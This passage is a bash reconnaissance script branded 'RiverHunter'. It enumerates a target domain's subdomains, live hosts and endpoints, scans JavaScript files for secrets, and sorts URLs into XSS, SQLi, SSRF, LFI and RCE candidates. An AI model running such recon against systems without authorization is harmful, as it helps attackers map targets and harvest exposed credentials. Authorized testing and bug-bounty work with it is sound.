#!/bin/bash
#Colors Output
NORMAL="\e[0m"			
RED="\033[0;31m" 		
GREEN="\033[0;32m"		   
BOLD="\033[01;01m"    	
WHITE="\033[1;37m"		
YELLOW="\033[1;33m"	
LRED="\033[1;31m"		
LGREEN="\033[1;32m"		
LBLUE="\033[1;34m"			
LCYAN="\033[1;36m"		
SORANGE="\033[0;33m"		      		
DGRAY="\033[1;30m"		
DSPACE="  "
CTAB="\t"
DTAB="\t\t"
TSPACE="   "
TTAB="\t\t\t"
QSPACE="    "
QTAB="\t\t\t\t"
BLINK="\e[5m"
TICK="\u2714"
CROSS="\u274c"
# Define the target domain
target=$1
dirdomain=$(printf $target | awk -F[.] '{print $1}')
TOOLS_DIR="$HOME/tools"
WORDLISTS_DIR="$HOME/wordlists"
# Activate the virtual environment
source "$HOME/.recon_venv/bin/activate"
# Add these new tool paths and outputs
fuzz_file="$HOME/wordlists/directory_wordlist.txt"
json_file="${dirdomain}/info/leaks.json"
leaks_file="${dirdomain}/info/porchemails.txt"
iptxt="${dirdomain}/info/ip.txt"
cmseek_output="${dirdomain}/vulnerability/cmseek.txt"
dirsearch_output="${dirdomain}/fuzzing/dirsearch.txt"
gospider_output="${dirdomain}/parameters/gospider"
meg_output="${dirdomain}/parameters/meg.txt"
unfurl_output="${dirdomain}/parameters/unfurl.txt"
gau_plus_output="${dirdomain}/parameters/gauplus.txt"
chaos_output="${dirdomain}/subdomains/chaos.txt"
dnsx_output="${dirdomain}/subdomains/dnsx.txt"
shodan_output="${dirdomain}/info/shodan.txt"
censys_output="${dirdomain}/info/censys.txt"
subfinder2_output="${dirdomain}/subdomains/subfinder2.txt"
puredns_output="${dirdomain}/subdomains/puredns.txt"
shuffledns_output="${dirdomain}/subdomains/shuffledns.txt"
alterx_output="${dirdomain}/subdomains/alterx.txt"
httpx_probe_output="${dirdomain}/info/httpx_probe.txt"
naabu_output="${dirdomain}/info/naabu_ports.txt"
nuclei_critical="${dirdomain}/vulnerability/nuclei_critical.txt"
nuclei_high="${dirdomain}/vulnerability/nuclei_high.txt"
nuclei_medium="${dirdomain}/vulnerability/nuclei_medium.txt"
katana_output="${dirdomain}/parameters/katana.txt"
gxss_output="${dirdomain}/vulnerability/gxss.txt"
sqlmap_output="${dirdomain}/vulnerability/sqlmap.txt"
whatweb_output="${dirdomain}/info/whatweb.txt"
wafw00f_output="${dirdomain}/info/wafw00f.txt"
eyewitness_output="${dirdomain}/screenshots/eyewitness"
gittools_output="${dirdomain}/osint/gittools"
jsscanner_output="${dirdomain}/vulnerability/jsscanner.txt"
corscanner_output="${dirdomain}/vulnerability/corscanner.txt"
ssrf_scanner="${dirdomain}/vulnerability/ssrf.txt"
prototype_scanner="${dirdomain}/vulnerability/prototype.txt"
webtech_output="${dirdomain}/info/webtech.txt"
arjun_output="${dirdomain}/parameters/arjun.txt"
ffuf_output="${dirdomain}/fuzzing/ffuf.txt"
jaeles_output="${dirdomain}/vulnerability/jaeles.txt"
crlfuzz_output="${dirdomain}/vulnerability/crlfuzz.txt"
xsstrike_output="${dirdomain}/vulnerability/xsstrike.txt"
dalfox_output="${dirdomain}/vulnerability/dalfox.txt"
subjs_output="${dirdomain}/info/subjs.txt"
linkfinder_output="${dirdomain}/info/linkfinder.txt"
secretfinder_output="${dirdomain}/info/secretfinder.txt"
getjs_output="${dirdomain}/info/getjs.txt"
subzy_output="${dirdomain}/vulnerability/subzy.txt"
notify_output="${dirdomain}/info/notify.txt"
axiom_output="${dirdomain}/info/axiom.txt"
amass_passive="${dirdomain}/subdomains/amass_passive.txt"
amass_active="${dirdomain}/subdomains/amass_active.txt"
tlsx_output="${dirdomain}/info/tlsx.txt"
asnmap_output="${dirdomain}/info/asnmap.txt"
clouddetect_output="${dirdomain}/info/clouddetect.txt"
ipcdn_output="${dirdomain}/info/ipcdn.txt"
csprecon_output="${dirdomain}/vulnerability/csprecon.txt"
paramspider_output="${dirdomain}/parameters/paramspider.txt"
gitdorker_output="${dirdomain}/osint/gitdorker.txt"
gitls_output="${dirdomain}/osint/gitls.txt"
dnsvalidator_output="${dirdomain}/info/dnsvalidator.txt"
dnsreaper_output="${dirdomain}/info/dnsreaper.txt"
hakrawler_output="${dirdomain}/parameters/hakrawler.txt"
waybackurls_output="${dirdomain}/parameters/waybackurls.txt"
gf_xss="${dirdomain}/vulnerability/gf_xss.txt"
gf_ssrf="${dirdomain}/vulnerability/gf_ssrf.txt"
gf_redirect="${dirdomain}/vulnerability/gf_redirect.txt"
gf_idor="${dirdomain}/vulnerability/gf_idor.txt"
gf_lfi="${dirdomain}/vulnerability/gf_lfi.txt"
gf_rce="${dirdomain}/vulnerability/gf_rce.txt"
kxss_output="${dirdomain}/vulnerability/kxss.txt"
airixss_output="${dirdomain}/vulnerability/airixss.txt"
cariddi_output="${dirdomain}/vulnerability/cariddi.txt"
nuclei_fuzz="${dirdomain}/vulnerability/nuclei_fuzz.txt"
sqlmap_dump="${dirdomain}/vulnerability/sqlmap_dump"
osmedeus_output="${dirdomain}/vulnerability/osmedeus"
reconftw_output="${dirdomain}/vulnerability/reconftw"
subfinder_config="${dirdomain}/config/subfinder-config.yaml"
amass_config="${dirdomain}/config/amass-config.ini"
httpx_tech="${dirdomain}/info/httpx_tech.txt"
nmap_vuln="${dirdomain}/vulnerability/nmap_vuln.txt"
masscan_output="${dirdomain}/info/masscan.txt"
rustscan_output="${dirdomain}/info/rustscan.txt"
wpscan_output="${dirdomain}/vulnerability/wpscan.txt"
joomscan_output="${dirdomain}/vulnerability/joomscan.txt"
droopescan_output="${dirdomain}/vulnerability/droopescan.txt"
nikto_output="${dirdomain}/vulnerability/nikto.txt"
wapiti_output="${dirdomain}/vulnerability/wapiti.txt"
zap_output="${dirdomain}/vulnerability/zap.txt"
xray_output="${dirdomain}/vulnerability/xray.txt"
feroxbuster_output="${dirdomain}/fuzzing/feroxbuster.txt"
gobuster_output="${dirdomain}/fuzzing/gobuster.txt"
dirb_output="${dirdomain}/fuzzing/dirb.txt"
arachni_output="${dirdomain}/vulnerability/arachni"
skipfish_output="${dirdomain}/vulnerability/skipfish"
w3af_output="${dirdomain}/vulnerability/w3af"
vega_output="${dirdomain}/vulnerability/vega"
acunetix_output="${dirdomain}/vulnerability/acunetix"
burp_output="${dirdomain}/vulnerability/burp"
netsparker_output="${dirdomain}/vulnerability/netsparker"
qualys_output="${dirdomain}/vulnerability/qualys"
snyk_output="${dirdomain}/vulnerability/snyk"
semgrep_output="${dirdomain}/vulnerability/semgrep"
trufflehog_output="${dirdomain}/vulnerability/trufflehog"
subfinder_passive="${dirdomain}/subdomains/subfinder_passive.txt"
subfinder_recursive="${dirdomain}/subdomains/subfinder_recursive.txt"
github_subdomains="${dirdomain}/subdomains/github_subdomains.txt"
gitlab_subdomains="${dirdomain}/subdomains/gitlab_subdomains.txt"
cero="${dirdomain}/subdomains/cero.txt"
analyticsrelationships="${dirdomain}/subdomains/analyticsrelationships.txt"
dnsprobe_output="${dirdomain}/info/dnsprobe.txt"
mapcidr_output="${dirdomain}/info/mapcidr.txt"
cdncheck_output="${dirdomain}/info/cdncheck.txt"
interactsh_output="${dirdomain}/vulnerability/interactsh.txt"
notify_discord="${dirdomain}/notifications/discord.txt"
notify_slack="${dirdomain}/notifications/slack.txt"
notify_telegram="${dirdomain}/notifications/telegram.txt"
freq_output="${dirdomain}/vulnerability/freq.txt"
subdomains_file="${dirdomain}/subdomains/subdomains.txt"
subdomains_live="${dirdomain}/subdomains/livesubdomain.txt"
# Create required directories
create_directories() {
    local dirs=(
        "${dirdomain}/subdomains/.tmp"
        "${dirdomain}/osint"
        "${dirdomain}/info"
        "${dirdomain}/wordlists"
        "${dirdomain}/fuzzing"
        "${dirdomain}/parameters"
        "${dirdomain}/vulnerability"
        "${dirdomain}/screenshots"
        "${dirdomain}/patterns"
    )
    
    for dir in "${dirs[@]}"; do
        mkdir -p "$dir"
    done
}

# Call directory creation
create_directories
ports="21,22,23,25,53,69,80,88,110,115,123,137,139,143,161,179,194,389,443,445,465,500,546,547,587,636,993,994,995,1025,1080,1194,1433,1434,1521,1701,1723,1812,1813,2049,2222,2375,2376,3306,3389,3690,4443,5432,5800,5900,5938,5984,6379,6667,6881,8080,8443,8880,9090,9418,9999,10000,11211,15672,27017,28017,3030,33060,4848,5000,5433,5672,6666,8000,8081,8444,8888,8905,9000,9042,9160,9990,11210,12201,15674,18080,1965,1978,2082,2083,2086,2087,2089,2096,22611,25565,27018,28015,33389,4369,49152,54321,54322,55117,55555,55672,5666,5671,6346,6347,6697,6882,6883,6884,6885,6886,6887,6888,6889,8088,8089,9001,9415,17089,27019,34443,3659,45557,55556,5673,5674,6370,6891,6892,6893,6894,6895,6896,6897,6898,6899,6900,6901,6902,6903,6904,6905,6906,6907,6908,6909,6910,6911,6912,6913,6914,6915,6916,6917,6918,6919,6920,6921,6922,6923,6924,6925,6926,81,300,591,593,832,981,1010,1311,1099,2095,2480,3000,3128,3333,4242,4243,4567,4711,4712,4993,5104,5108,5280,5281,5601,5985,6543,7000,7001,7396,7474,8001,8008,8014,8042,8060,8069,8083,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8500,8184,8834,8983,9043,9060,9080,9091,9200,9443,9502,9800,9981,10250,11371,12443,16080,17778,18091,18092,20720,32000,55440,22222,32400"
printf "${GREEN} 
                        ⣿⣿⣿⣿⣿⣿⣿⣉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                        ⣿⣿⣿⣿⣿⣿⣿⣿⣷⡈⢿⣿⣿⣿⣿⣿⣿⡏⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                        ⣿⣿⣿⣿⣿⣿⣍⡙⢿⣿⣦⡙⠻⣿⣿⣿⡿⠁⣾⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿
                        ⣿⣿⣿⣿⣿⣿⣿⣿⣦⡉⠛⠓⠢⡈⢿⡿⠁⣸⣿⡿⠿⢋⣴⣿⣿⣿⣿⣿⣿⣿
                        ⣿⣿⣿⣿⣿⣿⣯⣍⣙⡋⠠⠄⠄⠄⠄⠁⠘⠁⠄⠴⠚⠻⢿⣿⣿⣿⣿⣿⣿⣿  <<  RiverHunter TOOL >>
                        ⣿⣿⣿⣿⣿⣿⣿⡿⠿⢏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⣿⣿⣿⣿  <<  CODED BY RiverHunter >>
                        ⣿⣿⣿⣿⣿⣧⡴⠖⠒⠄⠁⠄⢀⠄⠄⠄⡀⠄⠄⠄⠄⠄⠄⣠⣿⣿⣿⣿⣿⣿  <<  INSTAGRAM==>RiverHunter >>
                        ⣿⣿⣿⠿⠟⣩⣴⣶⣿⣿⣶⡞⠉⣠⣇⠄⣿⣶⣦⣄⡀⠲⢿⣿⣿⣿⣿⣿⣿⣿
                        ⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⡿⢠⣿⣿⣿⢀⣿⣿⣿⣿⣿⣿⣶⣌⠻⠿⣿⣿⣿⣿ 
                        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢡⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿ 
                        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ \n
                        / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
                       ( R | e | v | e | r | H | u | n | t | e | r )
                        \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/   \n "
printf "          ${YELLOW}RiverHunter>${end}${GREEN} More Targets - More Options - More Opportunities${end}" | pv -qL 30
sleep 0.4
printf  "${NORMAL}\n[${BLINK}${CROSS}] ${NORMAL}${NORMAL}${LRED}Warning: Use with caution. You are responsible for your own actions.${NORMAL}\n"| pv -qL 30
printf  "${NORMAL}[${BLINK}${CROSS}] ${NORMAL}${LRED}Developers are not responsible for any misuse or damage cause by this tool.${NORMAL}\n"| pv -qL 30
wget -q --spider https://google.com
if [ $? -ne 0 ];then
    echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING TerminatorZ !" | lolcat
    exit 1
fi
tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat
printf "${GREEN}#######################################################################\n"
targetName="https://"$target
company=$(printf $dirdomain | awk -F[.] '{print $1}')
printf "${BOLD}${GREEN}[*] Time: ${YELLOW}${TSPACE}$(date "+%d-%m-%Y %H:%M:%S")${NORMAL}\n"
printf "${BOLD}${GREEN}[*] COMPANY:${YELLOW} $company ${NORMAL}\n"
printf "${BOLD}${GREEN}[*] Output:  ${YELLOW}$(pwd)/$dirdomain${NORMAL}\n"
printf "${BOLD}${GREEN}[*] TARGET URL:${YELLOW} $targetName ${NORMAL}\n"
ip_adress=$(dig +short $target | tr '\n' ' ' | sed 's/ $//')
printf "${BOLD}${GREEN}[*] TARGET IP : [${YELLOW}$ip_adress${NORMAL}]\n"
printf "${GREEN}#######################################################################\n"
# Function to scan for subdomains
scan_subdomains() {
   echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Starting subdomain enumeration for  ${YELLOW}$target${NORMAL}\n"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}subfinder${NORMAL}]"
    subfinder -silent -d $target -all -o ${dirdomain}/subdomains/subfinder.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}subfinder${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/subfinder.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${RED}${BLINK}assetfinder${NORMAL}]"
    assetfinder --subs-only $target | sort -u | anew -q ${dirdomain}/subdomains/assetfinder.txt
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}assetfinder${TICK}${NORMAL}]${DTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/assetfinder.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}findomain${NORMAL}]"
    findomain -r -q -t $target | anew -q ${dirdomain}/subdomains/findomain.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}findomain${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/findomain.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}sublist3r${NORMAL}]"
    python3 ~/tools/Sublist3r/sublist3r.py -d $target -o ${dirdomain}/subdomains/sublister.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}sublist3r${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/sublister.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}amass${NORMAL}]"
    amass enum -passive -norecursive -d $target -o ${dirdomain}/subdomains/amass.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}amass${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/amass.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}Certspo${NORMAL}]"
curl -s "https://api.certspotter.com/v1/issuances?domain=${target}&include_subdomains=true&expand=dns_names" | jq -r '.[].dns_names[]' | sed 's/\*\.//g' | sort -u >> "${dirdomain}/subdomains/Certspotter.txt" 2>/dev/null 
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}Certspo${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/Certspotter.txt 2> /dev/null | wc -l )"
 #   echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}CertSH${NORMAL}]"
 #  curl -s https://crt.sh/?q\=%.${target}\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> ${dirdomain}/subdomains/CertSH.txt &> /dev/null
   
  # ~/tools/massdns/scripts/ct.py $target | anew -q ${dirdomain}/subdomains/CertSH.txt  &> /dev/null
 #   echo -e "\033[2A"
 #   echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}CertSH${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/CertSH.txt 2> /dev/null | wc -l )"  
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}RapidDNS${NORMAL}]"
  curl -s "https://rapiddns.io/subdomain/${target}?full=1#result" |grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" |grep ".${target}" | sort -u >> ${dirdomain}/subdomains/RapidDNS.txt
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}RapidDNS${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/RapidDNS.txt 2> /dev/null | wc -l )"   
    
    

    
    
         echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}Alienvault${NORMAL}]"
  curl -s "https://otx.alienvault.com/api/v1/indicators/domain/${target}/passive_dns" | jq --raw-output '.passive_dns[]?.hostname' | sort -u >> ${dirdomain}/subdomains/Alienvault.txt
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}Alienvault${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/Alienvault.txt 2> /dev/null | wc -l )" 
    
    
             echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}Hackertarget${NORMAL}]"
  curl -s "https://api.hackertarget.com/hostsearch/?q=${target}"|grep -o "\w.*${target}">> ${dirdomain}/subdomains/Hackertarget.txt
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}Hackertarget${TICK}${NORMAL}]${DTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/Hackertarget.txt 2> /dev/null | wc -l )" 
      
              echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}Urlscan${NORMAL}]"
  curl -s "https://urlscan.io/api/v1/search/?q=domain:${target}"|jq '.results[].page.domain' 2>/dev/null |grep -o "\w.*${target}"|sort -u >> ${dirdomain}/subdomains/Urlscan.txt
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}Urlscan${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/Urlscan.txt 2> /dev/null | wc -l )" 
    # Add puredns for subdomain enumeration
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}puredns${NORMAL}]"
    puredns bruteforce $WORDLISTS_DIR/subdomain_megalist.txt $target -r $WORDLISTS_DIR/resolvers.txt -w $puredns_output &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}puredns${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/puredns.txt 2> /dev/null | wc -l)"

    # Add shuffledns for subdomain enumeration
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}shuffledns${NORMAL}]"
    shuffledns -d $target -w $WORDLISTS_DIR/subdomain_megalist.txt -r $WORDLISTS_DIR/resolvers.txt -o $shuffledns_output &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}shuffledns${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/shuffledns.txt 2> /dev/null | wc -l)"


 echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Filtering Alive subdomains\r"
cat ${dirdomain}/subdomains/*.txt | anew -q ${dirdomain}/subdomains/subdomains.txt  
cat $subdomains_file |sort |uniq >> ${dirdomain}/subdomains/subdomains.txt
echo -ne "${NORMAL}${BOLD}${GREEN}[*] Subdomains Found - ${YELLOW}Total of ${NORMAL}${LRED}$(wc -l ${dirdomain}/subdomains/subdomains.txt | awk '{print $1}') ${BOLD}${YELLOW}Subdomains Found\n"
cat -s ${dirdomain}/subdomains/subdomains.txt | httpx-toolkit -p 443,80,8080,8000 -silent >> ${dirdomain}/subdomains/httpx.txt 
cat -s ${dirdomain}/subdomains/httpx.txt | grep -Eo "https?://[^/]+\.${target}" >> ${dirdomain}/subdomains/livesubdomain.txt 
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${GREEN}[*] Live Subdomains Found - ${YELLOW}Total of ${NORMAL}${LRED}$(wc -l ${dirdomain}/subdomains/livesubdomain.txt | awk '{print $1}') ${BOLD}${YELLOW} Live Subdomains Found\n"

}
# Function to DNSx enumeration
DNSx_enumeration() {
    # Add DNSx enumeration
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] DNSx Scanning  -  ${NORMAL}[${LRED}${BLINK}DNSx${NORMAL}]"
    cat ${dirdomain}/subdomains/subdomains.txt | dnsx -silent -a -aaaa -cname -ns -txt -ptr -mx -soa -resp -json -o $dnsx_output&>/dev/null 
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] DNSx Scanned  -  ${NORMAL}[${GREEN}DNSx${TICK}${NORMAL}]${TTAB} DNSx Enumeration: ${LGREEN}Completed"
  # Add TLS/SSL scanning with tlsx
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] TLS/SSL Scanning  -  ${NORMAL}[${LRED}${BLINK}TLSX${NORMAL}]"
    tlsx -l ${dirdomain}/subdomains/subdomains.txt -o $tlsx_output &>/dev/null   
     echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] TLS/SSL Scanned  -  ${NORMAL}[${GREEN}TLSX${TICK}${NORMAL}]${TTAB} TLSX Enumeration: ${LGREEN}Completed"
    
    # Add alterx for subdomain enumeration
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] alterx Scanning  -  ${NORMAL}[${LRED}${BLINK}alterx${NORMAL}]"
    cat ${dirdomain}/subdomains/subdomains.txt | alterx -silent > $alterx_output&>/dev/null 
     echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] alterx Scanned  -  ${NORMAL}[${GREEN}alterx${TICK}${NORMAL}]${TTAB} alterx Enumeration: ${LGREEN}Completed"
}
# Function to get all endpoints
get_endpoints() {
    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[*] Starting Endpoints Scanning:${NORMAL}${BOLD} Getting all endpoints\r"
    echo -e "\n${NORMAL}${WHITE}${BLINK}${BOLD}${LRED}[!]${NORMAL}${WHITE}${BOLD}${LRED} Please wait while Getting all endpoints.This may take a while...${NORMAL}"
     waymore -i $target -mode U -oU $dirdomain/parameters/waymore.txt &> /dev/null
 # curl --silent "http://web.archive.org/cdx/search/cdx?url=*.${target}/*&output=text&fl=original&collapse=urlkey" > ${dirdomain}/parameters/WebArchive.txt &> /dev/null
   katana -silent -list ${dirdomain}/subdomains/livesubdomain.txt -o $dirdomain/parameters/katana.txt &> /dev/null
 cat ${dirdomain}/subdomains/livesubdomain.txt | gauplus --random-agent -b eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt -o ${dirdomain}/parameters/gauplus.txt &> /dev/null
  cat ${dirdomain}/subdomains/livesubdomain.txt | waybackurls | anew -q ${dirdomain}/parameters/waybackurls.txt &> /dev/null
cat ${dirdomain}/subdomains/livesubdomain.txt | hakrawler | grep -Eo "https?://[^/]+\.${target}" | tee -a $dirdomain/parameters/hakrawler-urls.txt &> /dev/null
 gospider -S ${dirdomain}/subdomains/livesubdomain.txt -t 50 -c 10 -d 3 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|svg)" -o $gospider_output &> /dev/null
 cat $gospider_output/* |grep -oE 'https?://[^[:space:]]+' | anew -q ${dirdomain}/parameters/gospider.txt &> /dev/null
    cat ${dirdomain}/parameters/*.txt | sed '/\[/d' | grep $target | sort -u | urldedupe -s | anew -q ${dirdomain}/parameters/endpoints.txt &> /dev/null
    
   echo -ne "${NORMAL}${BOLD}${LGREEN}[●] Endpoints Scanning Completed for Subdomains of ${NORMAL}${BOLD}${RED}$target${RED}${WHITE}\t Total: ${GREEN}$(cat ${dirdomain}/parameters/endpoints.txt 2> /dev/null | wc -l )\n"
   
    # Add JavaScript analysis tools
    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[*] Starting JavaScript Scanning:${NORMAL}${BOLD} Extracting JavaScript Files\r"
    
        echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Extracting JavaScript Files  -  ${NORMAL}[${LRED}${BLINK}subjs${NORMAL}]"
    cat ${dirdomain}/subdomains/livesubdomain.txt | subjs | tee -a $subjs_output&> /dev/null 
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Extracting JavaScript Files  -  ${NORMAL}[${GREEN}subjs${TICK}${NORMAL}]${TTAB} Extracting: ${LGREEN}Completed"
    
            echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Extracting JavaScript Files  -  ${NORMAL}[${LRED}${BLINK}getJS${NORMAL}]"
    cat ${dirdomain}/subdomains/livesubdomain.txt | getJS --complete | tee -a $getjs_output&> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Extracting JavaScript Files  -  ${NORMAL}[${GREEN}getJS${TICK}${NORMAL}]${TTAB} Extracting: ${LGREEN}Completed"
    
    
    
    # Add LinkFinder for endpoint discovery in JS
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Analyzing JavaScript   -  ${NORMAL}[${LRED}${BLINK}LinkFinder${NORMAL}]"
    for js in $(cat $subjs_output); do
        python3 $TOOLS_DIR/LinkFinder/linkfinder.py -i $js -o cli | tee -a $linkfinder_output&> /dev/null
    done
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Analyzing JavaScript  -  ${NORMAL}[${GREEN}LinkFinder${TICK}${NORMAL}]${TTAB} Analyzing: ${LGREEN}Completed"
    # Add SecretFinder for sensitive data in JS
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Searching Secrets in JavaScript  -  ${NORMAL}[${LRED}${BLINK}SecretFinder${NORMAL}]"
    for js in $(cat $subjs_output); do
        python3 $TOOLS_DIR/SecretFinder/SecretFinder.py -i $js -o cli | tee -a $secretfinder_output&> /dev/null
    done
echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Searching Secrets in JavaScript -  ${NORMAL}[${GREEN}SecretFinder${TICK}${NORMAL}]${TTAB} Searching: ${LGREEN}Completed"

        cat ${dirdomain}/parameters/endpoints.txt | gf xss | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/xss.txt
    cat ${dirdomain}/parameters/endpoints.txt | gf ssrf | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/ssrf.txt
    cat ${dirdomain}/parameters/endpoints.txt | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/sqli.txt
    cat ${dirdomain}/parameters/endpoints.txt | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/lfi.txt
    cat ${dirdomain}/parameters/endpoints.txt | gf rce | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/rce.txt
    cat ${dirdomain}/parameters/endpoints.txt | gf redirect | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/redirect.txt 



